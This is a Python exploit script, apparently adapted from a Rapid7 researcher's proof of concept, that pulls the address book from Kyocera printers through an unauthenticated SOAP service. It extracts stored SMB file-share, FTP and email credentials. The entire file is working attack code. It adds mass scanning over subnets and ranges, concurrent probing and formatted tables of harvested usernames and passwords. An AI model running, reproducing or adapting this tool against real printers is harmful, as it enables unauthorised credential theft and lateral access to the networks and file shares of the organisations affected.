"""
Kyocera printer exploit
Extracts sensitive data stored in the printer address book, unauthenticated, including:
    * email addresses
    * SMB file share credentials used to write scan jobs to a network fileshare
    * FTP credentials

Original Author: Aaron Herndon, @ac3lives (Rapid7)
Modified by: d4rkm4tt3r
Modified: multi-target support (CIDR / range / comma list), configurable port,
          credential-only output, pretty table rendering, -t target flag,
          pre-flight TCP check + concurrency, empty-book reporting

Usage:
    python3 getKyoceraCreds.py -t 172.16.2.0/24
    python3 getKyoceraCreds.py -t 172.16.2.1-172.16.2.10
    python3 getKyoceraCreds.py -t 172.16.2.1,172.16.2.2,172.16.2.50
    python3 getKyoceraCreds.py -t 172.16.2.5 -p 443

Optional pretty output:
    pip install rich
"""

import argparse
import ipaddress
import socket
import sys
import time
import warnings
from concurrent.futures import ThreadPoolExecutor, as_completed

import requests
import xmltodict

warnings.filterwarnings("ignore")

try:
    from rich.console import Console
    from rich.table import Table
    from rich import box
    from rich.panel import Panel
    from rich.text import Text
    _HAVE_RICH = True
    _console = Console()
except ImportError:
    _HAVE_RICH = False
    _console = None


BANNER = r"""
 _  __                               ____              _     ____                        
| |/ /   _  ___   ___ ___ _ __ __ _ / ___|_ __ ___  __| |___|  _ \ _   _ _ __ ___  _ __  
| ' / | | |/ _ \ / __/ _ \ '__/ _` | |   | '__/ _ \/ _` / __| | | | | | | '_ ` _ \| '_ \ 
| . \ |_| | (_) | (_|  __/ | | (_| | |___| | |  __/ (_| \__ \ |_| | |_| | | | | | | |_) |
|_|\_\__, |\___/ \___\___|_|  \__,_|\____|_|  \___|\__,_|___/____/ \__,_|_| |_| |_| .__/ 
     |___/                                                                        |_|    
"""

EXAMPLES = """\
Target formats (used with -t/--target):
  Single IP:    172.16.2.5
  CIDR:         172.16.2.0/24
  Range:        172.16.2.1-172.16.2.10   or   172.16.2.1-10
  Comma list:   172.16.2.1,172.16.2.2,172.16.2.50
  Mix:          172.16.2.0/28,172.16.3.5,172.16.4.1-10

Examples:
  python3 getKyoceraCreds.py -t 172.16.2.0/24
  python3 getKyoceraCreds.py -t 172.16.2.1-172.16.2.10
  python3 getKyoceraCreds.py -t 172.16.2.1,172.16.2.2,172.16.2.50
  python3 getKyoceraCreds.py -t 172.16.2.5 -p 443
  python3 getKyoceraCreds.py -t 172.16.2.0/24 --workers 100 --connect-timeout 1

Tip: install `rich` for nicer table output:
  pip install rich
"""


# ---------------------------------------------------------------------------
# Target parsing
# ---------------------------------------------------------------------------

def parse_targets(target_str):
    """
    Accepts:
      - CIDR:        172.16.2.0/24
      - Range:       172.16.2.1-172.16.2.10  (or  172.16.2.1-10)
      - Comma list:  172.16.2.1,172.16.2.2
      - Single IP:   172.16.2.5
    Returns a de-duplicated list of IP strings preserving order.
    """
    targets = []
    seen = set()

    def add(ip):
        if ip not in seen:
            seen.add(ip)
            targets.append(ip)

    if "," in target_str:
        for part in target_str.split(","):
            part = part.strip()
            if part:
                for ip in parse_targets(part):
                    add(ip)
        return targets

    if "-" in target_str:
        start_str, end_str = (s.strip() for s in target_str.split("-", 1))
        start_ip = ipaddress.IPv4Address(start_str)

        if "." not in end_str:
            start_octets = start_str.split(".")
            end_ip = ipaddress.IPv4Address(".".join(start_octets[:3] + [end_str]))
        else:
            end_ip = ipaddress.IPv4Address(end_str)

        if int(end_ip) < int(start_ip):
            raise ValueError(f"End IP {end_ip} is lower than start IP {start_ip}")

        for i in range(int(start_ip), int(end_ip) + 1):
            add(str(ipaddress.IPv4Address(i)))
        return targets

    if "/" in target_str:
        net = ipaddress.ip_network(target_str.strip(), strict=False)
        iterable = net.hosts() if net.num_addresses > 2 else net
        for ip in iterable:
            add(str(ip))
        return targets

    add(str(ipaddress.IPv4Address(target_str.strip())))
    return targets


# ---------------------------------------------------------------------------
# SOAP bodies
# ---------------------------------------------------------------------------

CREATE_ENUM_BODY = """<?xml version="1.0" encoding="utf-8"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope" xmlns:SOAP-ENC="http://www.w3.org/2003/05/soap-encoding" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:xop="http://www.w3.org/2004/08/xop/include" xmlns:ns1="http://www.kyoceramita.com/ws/km-wsdl/setting/address_book"><SOAP-ENV:Header><wsa:Action SOAP-ENV:mustUnderstand="true">http://www.kyoceramita.com/ws/km-wsdl/setting/address_book/create_personal_address_enumeration</wsa:Action></SOAP-ENV:Header><SOAP-ENV:Body><ns1:create_personal_address_enumerationRequest><ns1:number>25</ns1:number></ns1:create_personal_address_enumerationRequest></SOAP-ENV:Body></SOAP-ENV:Envelope>"""

GET_LIST_BODY = """<?xml version="1.0" encoding="utf-8"?><SOAP-ENV:Envelope xmlns:SOAP-ENV="http://www.w3.org/2003/05/soap-envelope" xmlns:SOAP-ENC="http://www.w3.org/2003/05/soap-encoding" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:wsa="http://schemas.xmlsoap.org/ws/2004/08/addressing" xmlns:xop="http://www.w3.org/2004/08/xop/include" xmlns:ns1="http://www.kyoceramita.com/ws/km-wsdl/setting/address_book"><SOAP-ENV:Header><wsa:Action SOAP-ENV:mustUnderstand="true">http://www.kyoceramita.com/ws/km-wsdl/setting/address_book/get_personal_address_list</wsa:Action></SOAP-ENV:Header><SOAP-ENV:Body><ns1:get_personal_address_listRequest><ns1:enumeration>{}</ns1:enumeration></ns1:get_personal_address_listRequest></SOAP-ENV:Body></SOAP-ENV:Envelope>"""

HEADERS = {"content-type": "application/soap+xml"}


# ---------------------------------------------------------------------------
# Result status constants
# ---------------------------------------------------------------------------

STATUS_OK          = "ok"             # creds extracted
STATUS_EMPTY       = "empty"          # exploit succeeded but address book had no creds
STATUS_UNREACHABLE = "unreachable"    # network-level failure
STATUS_BAD_RESP    = "bad_response"   # HTTP/XML-level failure


# ---------------------------------------------------------------------------
# Fast pre-flight port check
# ---------------------------------------------------------------------------

def port_open(ip, port, timeout):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            s.connect((ip, port))
        return True
    except (socket.timeout, ConnectionRefusedError, OSError):
        return False


def filter_live_targets(targets, port, connect_timeout, workers):
    live = []
    total = len(targets)
    done = 0

    with ThreadPoolExecutor(max_workers=workers) as pool:
        future_map = {pool.submit(port_open, ip, port, connect_timeout): ip
                      for ip in targets}
        for fut in as_completed(future_map):
            done += 1
            ip = future_map[fut]
            try:
                if fut.result():
                    live.append(ip)
            except Exception:
                pass
            if total >= 32 and (done % max(1, total // 10) == 0 or done == total):
                _status(f"Port probe: {done}/{total} checked, {len(live)} alive",
                        "info")

    live_set = set(live)
    return [ip for ip in targets if ip in live_set]


# ---------------------------------------------------------------------------
# Credential extraction
# ---------------------------------------------------------------------------

def walk_for_creds(node, creds, current=None):
    if current is None:
        current = {}

    if isinstance(node, dict):
        local = dict(current)
        for key, val in node.items():
            local_key = key.split(":")[-1] if ":" in key else key
            if isinstance(val, (dict, list)):
                continue
            text = val if isinstance(val, str) else ""

            if local_key == "login_name" and text:
                local["username"] = text
            elif local_key == "login_password" and text:
                local["password"] = text
            elif local_key in ("name", "address_name") and text and "label" not in local:
                local["label"] = text
            elif local_key == "host_name" and text:
                local["host"] = text
            elif local_key == "folder_path" and text:
                local["path"] = text
            elif local_key == "protocol" and text:
                local["proto"] = text

        for val in node.values():
            walk_for_creds(val, creds, local)

        if "username" in local or "password" in local:
            if not any(
                c.get("username") == local.get("username")
                and c.get("password") == local.get("password")
                and c.get("host") == local.get("host")
                for c in creds
            ):
                creds.append(local)

    elif isinstance(node, list):
        for item in node:
            walk_for_creds(item, creds, current)


def dump_creds(ip, port, timeout=10):
    """
    Returns a tuple (status, creds):
      status in {STATUS_OK, STATUS_EMPTY, STATUS_UNREACHABLE, STATUS_BAD_RESP}
      creds is a list (possibly empty) of credential dicts
    """
    url = f"https://{ip}:{port}/ws/km-wsdl/setting/address_book"

    try:
        r = requests.post(url, data=CREATE_ENUM_BODY, headers=HEADERS,
                          verify=False, timeout=timeout)
    except requests.exceptions.RequestException as e:
        _status(f"{ip}:{port} unreachable ({e.__class__.__name__})", "warn")
        return STATUS_UNREACHABLE, []

    if r.status_code != 200:
        _status(f"{ip}:{port} returned HTTP {r.status_code}", "warn")
        return STATUS_BAD_RESP, []

    try:
        parsed = xmltodict.parse(r.content.decode("utf-8", errors="replace"))
        enum_id = parsed["SOAP-ENV:Envelope"]["SOAP-ENV:Body"] \
            ["kmaddrbook:create_personal_address_enumerationResponse"] \
            ["kmaddrbook:enumeration"]
    except (KeyError, TypeError, Exception) as e:
        _status(f"{ip}:{port} unexpected response to enumeration request "
                f"({e.__class__.__name__})", "warn")
        return STATUS_BAD_RESP, []

    _status(f"{ip}:{port} obtained address book object {enum_id}, waiting for population...",
            "info")
    time.sleep(5)

    try:
        r = requests.post(url, data=GET_LIST_BODY.format(enum_id),
                          headers=HEADERS, verify=False, timeout=timeout)
    except requests.exceptions.RequestException as e:
        _status(f"{ip}:{port} error retrieving book ({e.__class__.__name__})", "warn")
        return STATUS_UNREACHABLE, []

    try:
        parsed = xmltodict.parse(r.content.decode("utf-8", errors="replace"))
    except Exception as e:
        _status(f"{ip}:{port} could not parse address book XML "
                f"({e.__class__.__name__})", "warn")
        return STATUS_BAD_RESP, []

    creds = []
    walk_for_creds(parsed, creds)

    if creds:
        _status(f"{ip}:{port} extracted {len(creds)} credential record(s)", "ok")
        return STATUS_OK, creds
    else:
        _status(f"{ip}:{port} address book reachable but empty (no credentials)", "info")
        return STATUS_EMPTY, []


def dump_creds_tagged(ip, port, timeout):
    """Runs dump_creds and returns (ip, port, status, creds)."""
    status, creds = dump_creds(ip, port, timeout=timeout)
    target = f"{ip}:{port}"
    for c in creds:
        c["_target"] = target
    return target, status, creds


# ---------------------------------------------------------------------------
# Output
# ---------------------------------------------------------------------------

def _status(msg, level="info"):
    if _HAVE_RICH:
        style = {"info": "cyan", "warn": "yellow", "err": "red",
                 "ok": "green"}.get(level, "white")
        marker = {"info": "[*]", "warn": "[-]",
                  "err": "[!]", "ok": "[+]"}.get(level, "[*]")
        _console.print(f"[{style}]{marker}[/{style}] {msg}")
    else:
        marker = {"info": "[*]", "warn": "[-]",
                  "err": "[!]", "ok": "[+]"}.get(level, "[*]")
        print(f"{marker} {msg}")


def build_rows(per_target_results):
    """
    Convert per-target results into flat display rows.
    per_target_results is a list of (target, status, creds).
    """
    rows = []
    for target, status, creds in per_target_results:
        if status == STATUS_OK and creds:
            for c in creds:
                rows.append({
                    "target":   target,
                    "proto":    (c.get("proto") or "-").upper(),
                    "host":     c.get("host") or "-",
                    "username": c.get("username") or "-",
                    "password": c.get("password") or "-",
                    "note":     "",
                })
        elif status == STATUS_EMPTY:
            rows.append({
                "target":   target,
                "proto":    "-",
                "host":     "-",
                "username": "empty",
                "password": "empty",
                "note":     "address book empty",
            })
        # Unreachable / bad_response are excluded from the final table —
        # they already showed up as [-] status lines during the sweep.
    return rows


def print_summary(per_target_results, target_count):
    rows = build_rows(per_target_results)

    ok_count    = sum(1 for _, s, _ in per_target_results if s == STATUS_OK)
    empty_count = sum(1 for _, s, _ in per_target_results if s == STATUS_EMPTY)
    cred_count  = sum(1 for r in rows if r["username"] != "empty")

    if not rows:
        _status(f"Finished. No reachable Kyocera targets with data across "
                f"{target_count} probed host(s).", "info")
        return

    title = (f"Summary — {cred_count} credential(s) from {ok_count} host(s), "
             f"{empty_count} empty, scanned {target_count}")

    if _HAVE_RICH:
        table = Table(
            title=title,
            title_style="bold magenta",
            box=box.DOUBLE_EDGE,
        )
        table.add_column("Target", style="cyan")
        table.add_column("Proto", style="magenta", width=6)
        table.add_column("Host", style="white")
        table.add_column("Username", style="bold green")
        table.add_column("Password", style="bold red")
        table.add_column("Note", style="dim italic")

        for r in rows:
            # Grey out the empty rows so they're visually distinct
            if r["username"] == "empty":
                table.add_row(
                    f"[dim]{r['target']}[/dim]",
                    f"[dim]{r['proto']}[/dim]",
                    f"[dim]{r['host']}[/dim]",
                    f"[dim]{r['username']}[/dim]",
                    f"[dim]{r['password']}[/dim]",
                    r["note"],
                )
            else:
                table.add_row(
                    r["target"],
                    r["proto"],
                    r["host"],
                    r["username"],
                    r["password"],
                    r["note"],
                )
        _console.print(table)
    else:
        headers = ["TARGET", "PROTO", "HOST", "USERNAME", "PASSWORD", "NOTE"]
        row_values = [[r["target"], r["proto"], r["host"],
                       r["username"], r["password"], r["note"]] for r in rows]

        widths = [max(len(h), *(len(v[i]) for v in row_values))
                  for i, h in enumerate(headers)]

        def hline(left, mid, right, fill="─"):
            return left + mid.join(fill * (w + 2) for w in widths) + right

        def row_fmt(cells):
            return "│" + "│".join(f" {str(c):<{widths[i]}} "
                                  for i, c in enumerate(cells)) + "│"

        print()
        print(f" {title} ".center(sum(widths) + 3 * len(widths) + 1, "═"))
        print(hline("┌", "┬", "┐"))
        print(row_fmt(headers))
        print(hline("├", "┼", "┤"))
        for v in row_values:
            print(row_fmt(v))
        print(hline("└", "┴", "┘"))


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------

def build_parser():
    ap = argparse.ArgumentParser(
        prog="getKyoceraCreds.py",
        description="Kyocera printer address-book credential extractor "
                    "(unauthenticated SOAP)",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=EXAMPLES,
        add_help=True,
    )
    ap.add_argument("-t", "--target", required=True,
                    help="Target spec: IP, CIDR, dash-range, or comma list "
                         "(see examples below)")
    ap.add_argument("-p", "--port", type=int, default=9091,
                    help="TCP port of the Kyocera SOAP service (default: 9091)")
    ap.add_argument("--timeout", type=int, default=10,
                    help="HTTP timeout in seconds for the exploit (default: 10)")
    ap.add_argument("--connect-timeout", type=float, default=1.0,
                    help="TCP connect-timeout for pre-flight port probe "
                         "in seconds (default: 1.0)")
    ap.add_argument("--workers", type=int, default=50,
                    help="Concurrent workers for port probe and exploitation "
                         "(default: 50)")
    ap.add_argument("--no-probe", action="store_true",
                    help="Skip pre-flight TCP probe, exploit every target")
    return ap


def print_banner_and_help(parser):
    if _HAVE_RICH:
        _console.print(Text(BANNER, style="bold cyan"))
        _console.print(Panel.fit(
            "[bold]Kyocera Address Book Credential Extractor[/bold]\n"
            "[dim]Unauthenticated SOAP — dumps SMB/FTP/email credentials[/dim]",
            border_style="magenta",
        ))
    else:
        print(BANNER)
        print("Kyocera Address Book Credential Extractor")
        print("Unauthenticated SOAP — dumps SMB/FTP/email credentials")
        print()
    parser.print_help()


def main():
    parser = build_parser()

    if len(sys.argv) == 1:
        print_banner_and_help(parser)
        sys.exit(0)

    args = parser.parse_args()

    if _HAVE_RICH:
        _console.print(Text(BANNER, style="bold cyan"))
    else:
        print(BANNER)

    try:
        targets = parse_targets(args.target)
    except (ValueError, ipaddress.AddressValueError) as e:
        _status(f"Invalid target specification: {e}", "err")
        sys.exit(1)

    _status(f"{len(targets)} target(s) parsed, port {args.port}", "info")

    if args.no_probe:
        live = targets
        _status("Skipping pre-flight probe (--no-probe)", "info")
    else:
        t0 = time.time()
        live = filter_live_targets(
            targets, args.port,
            connect_timeout=args.connect_timeout,
            workers=args.workers,
        )
        dt = time.time() - t0
        _status(
            f"{len(live)}/{len(targets)} responded on {args.port} in {dt:.1f}s",
            "ok" if live else "warn",
        )

    if not live:
        _status("No live targets — exiting.", "warn")
        sys.exit(0)

    per_target_results = []
    exploit_workers = min(args.workers, max(10, len(live)))

    with ThreadPoolExecutor(max_workers=exploit_workers) as pool:
        futures = {pool.submit(dump_creds_tagged, ip, args.port, args.timeout): ip
                   for ip in live}
        for fut in as_completed(futures):
            try:
                target, status, creds = fut.result()
                per_target_results.append((target, status, creds))
            except Exception as e:
                ip = futures[fut]
                _status(f"{ip}:{args.port} worker crashed ({e.__class__.__name__})",
                        "err")

    # Stable sort by target IP so the summary reads in order regardless of
    # completion sequence from the thread pool
    per_target_results.sort(key=lambda t: tuple(
        int(o) for o in t[0].split(":")[0].split(".")
    ))

    print_summary(per_target_results, len(live))


if __name__ == "__main__":
    main()
